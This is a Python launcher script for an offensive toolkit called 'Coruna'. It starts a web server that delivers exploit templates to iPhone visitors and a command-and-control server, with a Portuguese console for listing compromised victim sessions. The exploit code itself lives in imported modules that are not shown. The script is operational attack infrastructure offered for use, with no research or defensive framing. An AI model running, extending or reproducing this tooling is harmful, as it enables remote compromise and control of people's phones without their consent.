#!/usr/bin/env python3
"""
Entry point - Web server (Coruna exploit) + C2 server.
"""

import asyncio
import os
import sys

_script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(_script_dir)
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

from core.config_manager import ConfigManager
from web_server.exploit_http_server import ExploiterWebServer
from c2_comms.c2_server import C2Server


async def main():
    config = ConfigManager()
    queue = asyncio.Queue()

    c2_bind = config.get("c2_bind", "0.0.0.0")
    c2_port = config.get("c2_port", 8080)
    c2_server = C2Server(c2_bind, c2_port, queue)

    web_ip = config.get("web_server_ip", "0.0.0.0")
    web_port = config.get("web_server_port", 80)
    exploits_dir = config.get("exploit_templates_dir", "exploits")
    static_dir = config.get("static_files_dir", "web_server/static")
    web_server = ExploiterWebServer(web_ip, web_port, exploits_dir, static_dir)

    await web_server.start(config)
    c2_task = asyncio.create_task(c2_server.start())

    print("\n[*] Coruna rodando. Acesse http://IP_DA_VPS/ no iPhone")
    print("[*] Comandos: list (sessões) | quit (sair)\n")

    loop = asyncio.get_event_loop()
    while True:
        try:
            cmd = await loop.run_in_executor(None, lambda: input("(coruna)> ").strip().lower())
        except (EOFError, KeyboardInterrupt):
            break
        if cmd == "quit" or cmd == "exit":
            break
        if cmd in ("list", "ls", "sessions"):
            for s in c2_server.get_sessions_summary():
                print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
            if not c2_server.get_sessions_summary():
                print("  (nenhuma sessão)")

    c2_task.cancel()
    try:
        await c2_task
    except asyncio.CancelledError:
        pass
    c2_server.stop()
    await web_server.stop()


if __name__ == "__main__":
    asyncio.run(main())
